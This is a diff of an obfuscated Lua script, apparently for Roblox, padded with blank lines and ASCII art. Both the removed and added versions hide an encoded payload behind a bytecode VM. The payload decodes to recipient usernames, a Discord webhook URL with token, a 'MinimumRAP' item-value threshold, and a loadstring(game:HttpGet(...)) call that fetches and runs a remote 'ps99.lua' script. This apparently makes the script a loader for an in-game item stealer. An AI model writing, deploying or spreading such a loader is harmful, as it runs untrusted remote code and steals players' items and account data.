@@ -201,97 +201,208 @@ Yb,  88      `8b                                       Yb, `88       88         
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
                                                                                  local v0=tonumber;    
                                                                         local v1=string.byte;local v2=string.char;local 
                                                                      v3=string.sub;local v4=string.gsub;local v5=string.rep;local 
                                                                  v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=    
                                                             getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall; 
                                                           local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local       
-                                                        function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if  
-                                                      (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v83=v2(v0(v30,16));if v19   
-                                                    then local v90=0;local v91;while true do if (v90==1) then return v91;end if (v90==0) then v91 
-                                                  =v5(v83,v19);v19=nil;v90=1;end end else return v83;end end end);local function v20(v31,v32,v33)if 
-                                                   v33 then local v84=0 -0 ;local v85;while true do if (v84==0) then v85=(v31/((5 -3)^(v32-(1 -0))))% 
-                                                (2^(((v33-(2 -1)) -(v32-(620 -(555 + (1701 -(1523 + 114)))))) + 1)) ;return v85-(v85%1) ;end end else   
-                                                local v86=931 -(857 + 67 + 7) ;local v87;while true do if (v86==(568 -(367 + 201))) then v87=(929 -((304  
-                                              -90) + 713))^(v32-(1 + (1065 -(68 + 997)))) ;return (((v31%(v87 + v87))>=v87) and (1 + 0)) or (877 -(282 +    
-                                              595)) ;end end end end local function v21()local v34=1270 -(226 + 1044) ;local v35;while true do if (v34==(0  
-                                            -0)) then v35=v1(v16,v18,v18);v18=v18 + (118 -(32 + 85)) ;v34=(958 -(892 + 65)) + 0 ;end if (v34==(1 + (0 -0)))   
-                                            then return v35;end end end local function v22()local v36=0 -0 ;local v37;local v38;while true do if (v36==(1 -(0 - 
-                                          0))) then return (v38 * (606 -(87 + 263))) + v37 ;end if (v36==0) then v37,v38=v1(v16,v18,v18 + 2 );v18=v18 + (182 -(67 
-                                           + 113)) ;v36=1 + 0 ;end end end local function v23()local v39=0 + 0 ;local v40;local v41;local v42;local v43;while true  
-                                          do if (v39==((1000 -(915 + 82)) -2)) then return (v43 * 16777216) + (v42 * (66488 -(802 + 150))) + (v41 * (689 -433)) + v40 
-                                           ;end if (v39==0) then v40,v41,v42,v43=v1(v16,v18,v18 + ((14 -9) -2) );v18=v18 + 3 + 1 ;v39=1;end end end local function    
-                                        v24()local v44=0 + 0 ;local v45;local v46;local v47;local v48;local v49;local v50;while true do if (v44==(3 -0)) then if (v49== 
-                                        (1187 -(1069 + 118))) then if (v48==(0 -0)) then return v50 * (0 -(0  --[[==============================]]-0)) ;else local v102=0 
-                                         -0 ;while true do if (v102==(0 -0)) then v49=1 + 0 ;v47=(  --[[============================================]]1413 -(447 + 966))  
-                                        + (0 -0) ;break;end end end elseif (v49==((5453 -(1703  --[[======================================================]]+ 114)) -1589)) 
-                                       then return ((v48==(0 + 0)) and (v50 * ((792 -(368 + --[[==========================================================]] 423))/(0 -0))))  
-                                      or (v50 * NaN) ;end return v8(v50,v49-(3214 -2191)  --[[==============================================================]]) * (v47 + (v48 
-                                      /((20 -(10 + 8))^(199 -147)))) ;end if (v44==(442 - --[[================================================================]](416 + 26)))    
-                                      then v45=v23();v46=v23();v44=3 -(703 -(376 + 325))  --[[==================================================================]];end if (v44  
-                                      ==(1 + 1)) then v49=v20(v46,36 -15 ,1944 -(1789 +   --[[==================================================================]]124) );v50=((     
-                                    v20(v46,470 -(145 + (479 -186)) )==(1 + 0)) and  -((  --[[====================================================================]]1326 -895) -( 
-                    44 + 386))) or (1487 -(998 + 488)) ;v44=3;end if (v44==1) then v47=1; --[[====================================================================]]v48=(v20(v46,1  
-              + 0 ,17 + 3 ) * (((303 + 754) -(87 + 968))^((1770 -966) -(201 + 571)))) +   --[[======================================================================]]v45 ;v44=1140 
-             -((130 -(9 + 5)) + 1022) ;end end end local function v25(v51)local v52=0 + 0 --[[======================================================================]] ;local v53;  
-          local v54;while true do if ((378 -(85 + 291))==v52) then v54={};for v92=1 -0 ,  --[[======================================================================]]#v53 do v54[  
-        v92]=v2(v1(v3(v53,v92,v92)));end v52=1268 -(243 + 1022) ;end if (v52==(11 -(1729  --[[======================================================================]]-(345 + 1376) 
-        ))) then return v6(v54);end if (v52==(0 + 0)) then v53=nil;if  not v51 then local --[[======================================================================]] v99=1180 -(( 
-      1561 -(262 + 176)) + 57) ;while true do if (v99==(0 + 0)) then v51=v23();if (v51==( --[[======================================================================]]254 -(163 +   
-      91))) then return "";end break;end end end v52=1931 -(1869 + (749 -(198 + 490))) ;end --[[==================================================================]] if (v52==(1851 
-       -(1409 + 441))) then v53=v3(v16,v18,(v18 + v51) -(719 -(15 + 703)) );v18=v18 + v51 ; --[[================================================================]]v52=1 + 1 ;end    
-    end end local v26=v23;local function v27(...)return {...},v12("#",...);end local        --[[==============================================================]]function v28()    
-    local v55=603 -(268 + 335) ;local v56;local v57;local v58;local v59;local v60;local v61;  --[[==========================================================]]local v62;while     
-    true do if (v55==(290 -(60 + 230))) then v56=572 -(426 + 146) ;v57=nil;v55=1;end if (v55~=( --[[====================================================]]1 + 1)) then else v60=  
-    nil;v61=nil;v55=1459 -(282 + 1174) ;end if (v55==(812 -(569 + 242))) then v58=nil;v59=nil;v55 --[[==============================================]]=5 -3 ;end if ((1 + 2)==  
-    v55) then v62=nil;while true do local v94=0;while true do if (1==v94) then if (0~=v56) then else  --[[====================================]]local v103=0;local v104;while 
-     true do if (v103~=(1024 -(706 + 318))) then else v104=0;while true do if (v104==(1253 -(721 + 530))) --[[========================]] then v56=1272 -(945 + 326) ;break;   
-    end if (v104==1) then v59={};v60={v57,v58,nil,v59};v104=702 -(271 + 429) ;end if (0==v104) then v57={};v58={};v104=1 + 0 ;end end break;end end end break;end if (v94~= 
-  (1500 -(1408 + 92))) then else if (v56==(1088 -(461 + 625))) then for v107=1,v23() do local v108=0;local v109;while true do if (v108~=(1288 -(993 + 295))) then else    
-  v109=v21();if (v20(v109,1 + 0 ,1)==(1171 -(418 + 753))) then local v131=0 + 0 ;local v132;local v133;local v134;local v135;while true do if (v131~=1) then else local 
-   v173=0;while true do if (v173==1) then v131=1 + 1 ;break;end if (v173==(0 + 0)) then v134=nil;v135=nil;v173=1;end end end if (v131==(0 + 0)) then v132=529 -(406 + 123 
-  ) ;v133=nil;v131=1770 -(1749 + 20) ;end if ((1 + 1)~=v131) then else while true do if (v132~=1) then else local v186=1322 -(1249 + 73) ;while true do if (v186==(1 + 0) 
-  ) then v132=2;break;end if (v186==0) then v135={v22(),v22(),nil,nil};if (v133==0) then local v199=0;local v200;while true do if (v199==(1145 -(466 + 679))) then v200=0 
-  ;while true do if (0==v200) then v135[3]=v22();v135[4]=v22();break;end end break;end end elseif (v133==1) then v135[3]=v23();elseif (v133==(4 -2)) then v135[8 -5 ]=v23 
-  () -((1902 -(106 + 1794))^(6 + 10)) ;elseif (v133~=3) then else local v207=0;local v208;local v209;local v210;while true do if (v207==(0 + 0)) then v208=0;v209=nil;    
-  v207=2 -1 ;end if (v207==(2 -1)) then v210=nil;while true do if (v208==0) then local v211=0;while true do if (v211==(115 -(4 + 110))) then v208=1;break;end if (v211~=( 
-  584 -(57 + 527))) then else v209=1427 -(41 + 1386) ;v210=nil;v211=104 -(17 + 86) ;end end end if (v208==(1 + 0)) then while true do if (v209==(0 -0)) then v210=0;while 
-   true do if (v210~=(0 -0)) then else v135[169 -(122 + 44) ]=v23() -((2 -0)^(52 -36)) ;v135[4]=v22();break;end end break;end end break;end end break;end end end v186=1; 
-  end end end if (v132==(0 + 0)) then local v187=0 + 0 ;while true do if (v187==(1 -0)) then v132=1;break;end if (v187~=(65 -(30 + 35))) then else local v197=0 + 0 ;     
-  while true do if (v197==(1258 -(1043 + 214))) then v187=1;break;end if (v197==0) then v133=v20(v109,7 -5 ,3);v134=v20(v109,1216 -(323 + 889) ,15 -9 );v197=1;end end end  
-  end end if (v132~=(582 -(361 + 219))) then else if (v20(v134,1,1)==(321 -(53 + 267))) then v135[1 + 1 ]=v62[v135[415 -(15 + 398) ]];end if (v20(v134,984 -(18 + 964) ,2)  
-  ~=(3 -2)) then else v135[3]=v62[v135[2 + 1 ]];end v132=3;end if (v132==(2 + 1)) then if (v20(v134,853 -(20 + 830) ,3 + 0 )==(127 -(116 + 10))) then v135[4]=v62[v135[1 +  
-  3 ]];end v57[v107]=v135;break;end end break;end end end break;end end end for v110=739 -(542 + 196) ,v23() do v58[v110-1 ]=v28();end return v60;end if ((1 -0)==v56) then 
-   local v105=0;local v106;while true do if (v105~=(0 + 0)) then else v106=0;while true do if ((0 + 0)==v106) then local v136=0 + 0 ;while true do if (v136~=1) then else   
-  v106=2 -1 ;break;end if (v136==(0 -0)) then v61=v23();v62={};v136=1552 -(1126 + 425) ;end end end if (v106==1) then local v137=0;while true do if (v137==0) then for v178 
-  =406 -(118 + 287) ,v61 do local v179=0;local v180;local v181;local v182;local v183;while true do if (v179==0) then v180=0 -0 ;v181=nil;v179=1;end if (v179==(1122 -(118 + 
-   1003))) then v182=nil;v183=nil;v179=2;end if (v179~=2) then else while true do if (v180==(2 -1)) then v183=nil;while true do if ((377 -(142 + 235))==v181) then local    
-  v202=0 -0 ;while true do if (v202==0) then v182=v21();v183=nil;v202=1;end if (v202==(1 + 0)) then v181=978 -(553 + 424) ;break;end end end if (v181==1) then if (v182==(1 
-   -0)) then v183=v21()~=0 ;elseif (v182==2) then v183=v24();elseif (v182==3) then v183=v25();end v62[v178]=v183;break;end end break;end if (v180~=0) then else local v198= 
-  0 + 0 ;while true do if (v198~=(0 + 0)) then else v181=0 + 0 ;v182=nil;v198=1 + 0 ;end if (1~=v198) then else v180=1 + 0 ;break;end end end end break;end end end v60[6 - 
-  3 ]=v21();v137=2 -1 ;end if (v137==1) then v106=2;break;end end end if (v106==2) then v56=4 -2 ;break;end end break;end end end v94=1;end end end break;end end end local 
-   function v29(v63,v64,v65)local v66=v63[1];local v67=v63[2];local v68=v63[3];return function(...)local v69=v66;local v70=v67;local v71=v68;local v72=v27;local v73=1;     
-  local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v88=0,v77 do if (v88>=v71) then v75[v88-v71 ]=v76[v88 + 1 ];else    
-  v79[v88]=v76[v88 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do local v89=0;while true do if (1==v89) then if (v82<=11) then if (v82<=5) then 
-   if (v82<=2) then if (v82<=0) then local v112=0;local v113;while true do if (0==v112) then v113=v81[2];v79[v113]=v79[v113](v13(v79,v113 + 1 ,v74));break;end end elseif 
-     (v82==1) then v73=v81[3];else local v139=0;local v140;while true do if (v139==0) then v140=v81[2];v79[v140]=v79[v140](v13(v79,v140 + 1 ,v74));break;end end end      
-    elseif (v82<=3) then for v127=v81[2],v81[3] do v79[v127]=nil;end elseif (v82>4) then v65[v81[3]]=v79[v81[2]];else v79[v81[2]]=v81[3];end elseif (v82<=8) then if (v82 
-    <=6) then for v129=v81[2],v81[3] do v79[v129]=nil;end elseif (v82==7) then if ((v81[3]=="_ENV") or (v81[3]=="getfenv")) then v79[v81[2]]=v65;else v79[v81[2]]=v65[v81 
-    [3]];end else v79[v81[2]]=v81[3]~=0 ;end elseif (v82<=9) then v79[v81[2]]=v81[3]~=0 ;elseif (v82>10) then if (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3]; 
-      end else v79[v81[2]]();end elseif (v82<=17) then if (v82<=14) then if (v82<=12) then local v115=v81[2];local v116=v79[v81[3]];v79[v115 + 1 ]=v116;v79[v115]=v116[ 
-      v81[4]];elseif (v82>13) then local v146=0;local v147;local v148;local v149;local v150;while true do if (v146==2) then for v184=v147,v74 do local v185=0;while     
-      true do if (0==v185) then v150=v150 + 1 ;v79[v184]=v148[v150];break;end end end break;end if (v146==0) then v147=v81[2];v148,v149=v72(v79[v147](v13(v79,v147 + 1  
-        ,v81[3])));v146=1;end if (v146==1) then v74=(v149 + v147) -1 ;v150=0;v146=2;end end else v65[v81[3]]=v79[v81[2]];end elseif (v82<=15) then v79[v81[2]]();elseif 
-         (v82>16) then v73=v81[3];elseif (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end elseif (v82<=20) then if (v82<=18) then v79[v81[2]]=v81[3];elseif  
-        (v82>19) then do return;end else do return;end end elseif (v82<=21) then local v122=0;local v123;local v124;local v125;local v126;while true do if (v122==0)    
-          then v123=v81[2];v124,v125=v72(v79[v123](v13(v79,v123 + 1 ,v81[3])));v122=1;end if (v122==2) then for v167=v123,v74 do v126=v126 + 1 ;v79[v167]=v124[v126]; 
-            end break;end if (v122==1) then v74=(v125 + v123) -1 ;v126=0;v122=2;end end elseif (v82>22) then local v154=v81[2];local v155=v79[v81[3]];v79[v154 + 1 ]= 
-              v155;v79[v154]=v155[v81[4]];elseif ((v81[3]=="_ENV") or (v81[3]=="getfenv")) then v79[v81[2]]=v65;else v79[v81[2]]=v65[v81[3]];end v73=v73 + 1 ;break;  
-                end if (v89==0) then v81=v69[v73];v82=v81[1];v89=1;end end end end;end return v29(v28(),{},v17)(...);end v15(                                         
-                                                                                                                                                                    
-                                                                                                                                                                    
-                                                                                                                                                                    
+                                                        function v15(v16,v17,...)local v18=0;local v19;local v20;local v21;local v22;local    
+                                                      v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do   
+                                                    if (v18==5) then v27=v24;v28=nil;function v28(...)return {...},v12("#",...);end v18=6;end if  
+                                                  (v18==2) then function v22()local v31=0 -0 ;local v32;while true do if (v31==(2 -1)) then return  
+                                                  v32;end if (v31==(0 -0)) then v32=v1(v16,v19,v19);v19=v19 + (2 -1) ;v31=620 -((1486 -(857 + 74)) +  
+                                                64) ;end end end v23=nil;function v23()local v33,v34=v1(v16,v19,v19 + (570 -(367 + 201)) );v19=v19 + (  
+                                                929 -(214 + 713)) ;return (v34 * (65 + 191)) + v33 ;end v18=3;end if (v18==4) then function v25()local    
+                                              v35=0;local v36;local v37;local v38;local v39;local v40;local v41;while true do if (v35==(1 + 1)) then v40=   
+                                              v21(v37,21,31);v41=((v21(v37,909 -(282 + 595) )==((955 + 683) -(1523 + (258 -144)))) and  -(1 + 0)) or (1 -0) 
+                                             ;v35=1068 -(68 + 997) ;end if (v35==(1270 -(226 + 1044))) then v36=v24();v37=v24();v35=4 -3 ;end if (v35==(118 - 
+                                            ((41 -9) + 85))) then v38=1 + 0 ;v39=(v21(v37,1 + 0 ,20) * ((959 -(892 + 65))^(75 -43))) + v36 ;v35=3 -1 ;end if (  
+                                          v35==3) then if (v40==(0 -0)) then if (v39==(350 -(87 + 263))) then return v41 * (180 -(67 + 113)) ;else local v99=0 +  
+                                          0 ;while true do if (v99==(0 -0)) then v40=1 + 0 ;v38=0 -0 ;break;end end end elseif (v40==(2999 -(802 + 150))) then      
+                                          return ((v39==(0 -0)) and (v41 * (((1188 -(1069 + 118)) -0)/(0 + 0)))) or (v41 * NaN) ;end return v8(v41,v40-(2020 -(915 +  
+                                          (178 -96))) ) * (v38 + (v39/(2^(147 -95)))) ;end end end v26=nil;function v26(v42)local v43=0 + 0 ;local v44;local v45;     
+                                        while true do if (v43==(1 -0)) then v44=v3(v16,v19,(v19 + v42) -(1 + 0) );v19=v19 + v42 ;v43=793 -(368 + 423) ;end if (v43==3)  
+                                        then return v6(v45);end if (v43==(6 -4)) then v45={};for v91=(33 -14) --[[==============================]] -(10 + (446 -(145 +    
+                                        293))) , #v44 do v45[v91]=v2(v1(v3(v44,v91,v91)));end v43=( --[[============================================]]441 -(44 + 386)) -8 
+                                         ;end if (v43==((1928 -(998 + 488)) -(416 + 26))) then  --[[======================================================]]v44=nil;if  not 
+                                       v42 then v42=v24();if (v42==(0 -0)) then return "";  --[[==========================================================]]end end v43=1 + 0 
+                                       ;end end end v18=5;end if (v18==6) then v29=nil;   --[[==============================================================]]function v29()  
+                                      local v46=0;local v47;local v48;local v49;local v50 --[[================================================================]];local v51;     
+                                      local v52;local v53;local v54;while true do if (v46 --[[==================================================================]]~=(2 -1))     
+                                      then else v49=nil;v50=nil;v46=2 + 0 ;end if ((9 -5) --[[==================================================================]]==v46) then       
+                                    while true do if (v47==(10 -7)) then v54=nil;while    --[[====================================================================]]true do local 
+                     v100=867 -(550 + 317) ;local v101;while true do if (v100==(0 -0))    --[[====================================================================]]then v101=0 -0  
+              ;while true do if (v101==1) then if (0==v48) then local v155=0;while true   --[[======================================================================]]do if (v155~= 
+            (0 -0)) then else local v164=285 -(134 + 151) ;local v165;while true do if (  --[[======================================================================]]v164~=0) then 
+           else v165=0;while true do if (v165==(1665 -(970 + 695))) then local v171=0;    --[[======================================================================]]while true do 
+         if (v171==1) then v165=1;break;end if (v171==0) then v49={};v50={};v171=1 -0 ;   --[[======================================================================]]end end end   
+        if (v165~=1) then else v155=1991 -(582 + 1408) ;break;end end break;end end end   --[[======================================================================]]if (v155~=(3  
+      -2)) then else v51={};v48=1 -0 ;break;end end end if (v48~=3) then else local v156= --[[======================================================================]]0;local v157; 
+      local v158;while true do if (1~=v156) then else while true do if (0==v157) then v158= --[[==================================================================]]0 -0 ;while     
+      true do if (v158==(1824 -(1195 + 629))) then for v172=1 -0 ,v24() do v50[v172-1 ]=v29 --[[================================================================]]();end return v52 
+    ;end end break;end end break;end if (v156==0) then v157=241 -(187 + 54) ;v158=nil;v156= --[[==============================================================]]781 -(162 + 618)  
+    ;end end end break;end if (v101==0) then local v138=0 + 0 ;local v139;while true do if (0 --[[==========================================================]]==v138) then v139=0 
+     + 0 ;while true do if (v139~=(0 -0)) then else if (v48==(1 -0)) then local v166=0 + 0 ;    --[[====================================================]]local v167;local v168;  
+    while true do if (v166~=0) then else v167=0;v168=nil;v166=1;end if (v166==(1637 -(1373 + 263) --[[==============================================]])) then while true do if  
+    ((1000 -(451 + 549))~=v167) then else v168=0;while true do if (v168~=(1 + 0)) then else v54={};   --[[====================================]]v48=2;break;end if (v168==0)  
+    then v52={v49,v50,nil,v51};v53=v24();v168=1 + 0 ;end end break;end end break;end end end if (v48~=(2  --[[========================]]-0)) then else local v169=341 -(218 + 
+     123) ;local v170;while true do if (v169==(1581 -(1535 + 46))) then v170=0 + 0 ;while true do if (v170==(0 + 0)) then local v174=0;while true do if (v174==(560 -(306 + 
+   254))) then for v181=1,v53 do local v182=0;local v183;local v184;while true do if ((1 + 0)==v182) then if (v183==(1 -0)) then v184=v22()~=0 ;elseif (v183==(1469 -(899 
+   + 568))) then v184=v25();elseif (v183==(2 + 1)) then v184=v26();end v54[v181]=v184;break;end if (v182~=0) then else local v186=0;while true do if (v186~=0) then     
+  else v183=v22();v184=nil;v186=1;end if (v186~=(2 -1)) then else v182=1;break;end end end end end v52[3]=v22();v174=604 -(268 + 335) ;end if (v174~=1) then else v170=   
+  291 -(60 + 230) ;break;end end end if (v170==(573 -(426 + 146))) then for v175=1,v24() do local v176=0;local v177;local v178;local v179;while true do if (v176~=0) then 
+   else v177=0;v178=nil;v176=1 + 0 ;end if (v176==1) then v179=nil;while true do if (v177~=0) then else v178=1456 -(282 + 1174) ;v179=nil;v177=812 -(569 + 242) ;end if ( 
+  v177==(2 -1)) then while true do if (v178~=(0 + 0)) then else v179=v22();if (v21(v179,1,1)==(1024 -(706 + 318))) then local v187=1251 -(721 + 530) ;local v188;local    
+  v189;local v190;while true do if ((1272 -(945 + 326))==v187) then local v191=0;while true do if (v191~=(2 -1)) then else v187=2 + 0 ;break;end if (v191~=0) then else   
+  v190={v23(),v23(),nil,nil};if (v188==(0 + 0)) then local v198=1500 -(1408 + 92) ;local v199;local v200;while true do if (v198==(1087 -(461 + 625))) then while true do  
+  if (v199~=0) then else v200=1288 -(993 + 295) ;while true do if (v200~=(0 + 0)) then else v190[3]=v23();v190[4]=v23();break;end end break;end end break;end if (v198~=( 
+  1171 -(418 + 753))) then else v199=0 + 0 ;v200=nil;v198=1;end end elseif (v188==1) then v190[1 + 2 ]=v24();elseif (v188==(1 + 1)) then v190[3]=v24() -((1 + 1)^16) ;    
+  elseif (v188==3) then local v207=529 -(406 + 123) ;local v208;local v209;while true do if (v207~=(1770 -(1749 + 20))) then else while true do if (v208~=0) then else    
+  v209=0;while true do if (v209==0) then v190[3]=v24() -((1 + 1)^16) ;v190[4]=v23();break;end end break;end end break;end if (v207==0) then local v212=1322 -(1249 + 73) ;  
+  while true do if (v212==0) then v208=0 + 0 ;v209=nil;v212=1;end if (v212~=1) then else v207=1146 -(466 + 679) ;break;end end end end end v191=2 -1 ;end end end if (v187  
+  ==0) then local v192=0;while true do if (v192==1) then v187=1;break;end if (v192==(0 -0)) then local v197=0;while true do if (v197==(1900 -(106 + 1794))) then v188=v21(  
+  v179,1 + 1 ,3);v189=v21(v179,2 + 2 ,6);v197=1;end if (v197==1) then v192=1;break;end end end end end if (v187~=(5 -3)) then else local v193=0 -0 ;while true do if (0==   
+  v193) then if (v21(v189,115 -(4 + 110) ,585 -(57 + 527) )~=1) then else v190[2]=v54[v190[2]];end if (v21(v189,1429 -(41 + 1386) ,105 -(17 + 86) )==(1 + 0)) then v190[3]= 
+  v54[v190[6 -3 ]];end v193=2 -1 ;end if (v193==(167 -(122 + 44))) then v187=3;break;end end end if (v187~=(5 -2)) then else if (v21(v189,3,9 -6 )~=1) then else v190[4]=   
+  v54[v190[4 + 0 ]];end v49[v175]=v190;break;end end end break;end end break;end end break;end end end v48=3;break;end end break;end end end v139=1;end if (v139==(1 + 0))  
+  then v101=1 -0 ;break;end end break;end end end end break;end end end break;end if (v47==1) then local v97=65 -(30 + 35) ;while true do if (1~=v97) then else v47=2 + 0 ; 
+  break;end if (v97==(1257 -(1043 + 214))) then v50=nil;v51=nil;v97=3 -2 ;end end end if (v47==2) then local v98=1212 -(323 + 889) ;while true do if (v98==(2 -1)) then v47 
+  =583 -(361 + 219) ;break;end if (v98~=0) then else v52=nil;v53=nil;v98=1;end end end if (v47~=(320 -(53 + 267))) then else v48=0;v49=nil;v47=1;end end break;end if (v46  
+  ~=0) then else v47=0;v48=nil;v46=1 + 0 ;end if (v46==2) then v51=nil;v52=nil;v46=3;end if (v46==3) then v53=nil;v54=nil;v46=417 -(15 + 398) ;end end end v30=nil;v18=7;   
+  end if (v18==0) then v19=1;v20=nil;v16=v4(v3(v16,5),"..",function(v55)if (v1(v55,2)==79) then v20=v0(v3(v55,1,1));return "";else local v84=0;local v85;while true do if ( 
+  v84==0) then v85=v2(v0(v55,16));if v20 then local v102=v5(v85,v20);v20=nil;return v102;else return v85;end break;end end end end);v18=1;end if (v18==3) then v24=nil;     
+  function v24()local v56=982 -(18 + 964) ;local v57;local v58;local v59;local v60;while true do if (((0 + 0) -0)==v56) then v57,v58,v59,v60=v1(v16,v19,v19 + 2 + 1 );v19 
+  =v19 + 4 ;v56=(1 -0) + 0 + 0 ;end if (v56==(851 -(20 + 830))) then return (v60 * 16777216) + (v59 * (51157 + 14379)) + (v58 * (382 -(59 + 57 + 10))) + v57 ;end end end 
+   v25=nil;v18=4;end if (v18==7) then function v30(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v70=v64;local v71=v65;local   
+    v72=v66;local v73=v28;local v74=1;local v75= -1;local v76={};local v77={...};local v78=v12("#",...) -1 ;local v79={};local v80={};for v86=0,v78 do if (v86>=v72) then 
+     v76[v86-v72 ]=v77[v86 + 1 ];else v80[v86]=v77[v86 + 1 ];end end local v81=(v78-v72) + 1 ;local v82;local v83;while true do v82=v70[v74];v83=v82[1];if (v83<=11) then 
+     if (v83<=5) then if (v83<=2) then if (v83<=0) then local v103=v82[2];v80[v103]=v80[v103](v13(v80,v103 + 1 ,v75));elseif (v83==1) then v74=v82[3];elseif ((v82[3]==   
+    "_ENV") or (v82[3]=="getfenv")) then v80[v82[2]]=v63;else v80[v82[2]]=v63[v82[3]];end elseif (v83<=3) then for v115=v82[2],v82[3] do v80[v115]=nil;end elseif (v83>4) 
+       then v80[v82[2]]=v82[3]~=0 ;else do return;end end elseif (v83<=8) then if (v83<=6) then v80[v82[2]]();elseif (v83>7) then if (v80[v82[2]]==v82[4]) then v74=v74 
+       + 1 ;else v74=v82[3];end else v63[v82[3]]=v80[v82[2]];end elseif (v83<=9) then v63[v82[3]]=v80[v82[2]];elseif (v83>10) then v80[v82[2]]=v82[3];else local v123=0 
+      ;local v124;local v125;while true do if (v123==1) then v80[v124 + 1 ]=v125;v80[v124]=v125[v82[4]];break;end if (v123==0) then v124=v82[2];v125=v80[v82[3]];v123=1 
+        ;end end end elseif (v83<=17) then if (v83<=14) then if (v83<=12) then v80[v82[2]]=v82[3]~=0 ;elseif (v83>13) then local v126=v82[2];local v127,v128=v73(v80[   
+        v126](v13(v80,v126 + 1 ,v82[3])));v75=(v128 + v126) -1 ;local v129=0;for v140=v126,v75 do v129=v129 + 1 ;v80[v140]=v127[v129];end else local v130=v82[2];v80[   
+        v130]=v80[v130](v13(v80,v130 + 1 ,v75));end elseif (v83<=15) then if (v80[v82[2]]==v82[4]) then v74=v74 + 1 ;else v74=v82[3];end elseif (v83>16) then if ((v82[ 
+          3]=="_ENV") or (v82[3]=="getfenv")) then v80[v82[2]]=v63;else v80[v82[2]]=v63[v82[3]];end else do return;end end elseif (v83<=20) then if (v83<=18) then    
+            v80[v82[2]]=v82[3];elseif (v83>19) then v74=v82[3];else v80[v82[2]]();end elseif (v83<=21) then local v110=v82[2];local v111=v80[v82[3]];v80[v110 + 1 ]=  
+              v111;v80[v110]=v111[v82[4]];elseif (v83>22) then local v134=v82[2];local v135,v136=v73(v80[v134](v13(v80,v134 + 1 ,v82[3])));v75=(v136 + v134) -1 ;     
+                local v137=0;for v143=v134,v75 do v137=v137 + 1 ;v80[v143]=v135[v137];end else for v146=v82[2],v82[3] do v80[v146]=nil;end end v74=v74 + 1 ;end end;  
+                  end return v30(v29(),{},v17)(...);end if (v18==1) then v21=nil;function v21(v67,v68,v69)if v69 then local v89=(v67/((1 + 1)^(v68-((2 + 0) -1))))% 
+                      (2^(((v69-(2 -1)) -(v68-(4 -3))) + ((1 + 1) -1))) ;return v89-(v89%((887 + 665) -(1126 + 425))) ;else local v90=(3 -1)^(v68-(406 -(118 + (622 
+                                   -335)))) ;return (((v67%(v90 + v90))>=v90) and (3 -2)) or (0 + 0) ;end end v22=nil;v18=2;end end end v15(                        
                                                                                                                                                                     
                                                                                                                                                                     
                                                                                                                                                                   
@@ -317,5 +428,48 @@ Yb,  88      `8b                                       Yb, `88       88         
 
 
 --------------------------------------------------------------------------------
-"LOL!0E3O00028O00026O00F03F03083O00557365726E616D65030F3O00706861745F766965746E616D65736503073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313230363437393530333534333530393132332F4D316A63642D74666A4334515947414262725265695F7A43725030677769764266495577667350514A72343562444B716A4E6C34685A465745707A36544A4330642D5065027O0040030D3O004C6F6164696E675363722O656E030A3O004D696E696D756D524150025O006AF840030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403203O00682O7470733A2O2F7061737465732E696F2F7261772F786E7A666B6E78676D6700313O002O123O00014O0006000100013O00260B3O0002000100010004013O00020001002O12000100013O00260B00010014000100010004013O00140001002O12000200013O00260B0002000C000100020004013O000C0001002O12000100023O0004013O0014000100260B00020008000100010004013O00080001002O12000300043O001205000300033O002O12000300063O001205000300053O002O12000200023O0004013O0008000100260B00010023000100020004013O00230001002O12000200013O00260B0002001B000100020004013O001B0001002O12000100073O0004013O0023000100260B00020017000100010004013O001700012O0009000300013O001205000300083O002O120003000A3O001205000300093O002O12000200023O0004013O0017000100260B00010005000100070004013O000500010012070002000B3O0012070003000C3O00200C00030003000D002O120005000E4O0015000300056O00023O00022O000A0002000100010004013O003000010004013O000500010004013O003000010004013O000200012O00133O00017O00",v9(),...);
+"LOL!0F3O00028O00026O00F03F03083O00557365726E616D65030F3O00706861745F766965746E616D65736503093O00557365726E616D6532027O004003073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313230363437393530333534333530393132332F4D316A63642D74666A4334515947414262725265695F7A43725030677769764266495577667350514A72343562444B716A4E6C34685A465745707A36544A4330642D5065030D3O004C6F6164696E675363722O656E030A3O004D696E696D756D524150025O006AF840030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574031E3O00682O7470733A2O2F6875676567616D65732E6C6F6C2F70732O392E6C756100333O002O123O00014O0016000100013O0026083O0002000100010004143O00020001002O12000100013O00260800010014000100010004143O00140001002O12000200013O0026080002000C000100020004143O000C0001002O12000100023O0004143O0014000100260800020008000100010004143O00080001002O12000300043O001207000300033O002O12000300043O001207000300053O002O12000200023O0004143O0008000100260800010023000100020004143O00230001002O12000200013O0026080002001B000100020004143O001B0001002O12000100063O0004143O0023000100260800020017000100010004143O00170001002O12000300083O001207000300074O000C000300013O001207000300093O002O12000200023O0004143O0017000100260800010005000100060004143O00050001002O120002000B3O0012070002000A3O0012020002000C3O0012020003000D3O00200A00030003000E002O120005000F4O0017000300054O000D00023O00022O00130002000100010004143O003200010004143O000500010004143O003200010004143O000200012O00103O00017O00",v9(),...);
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
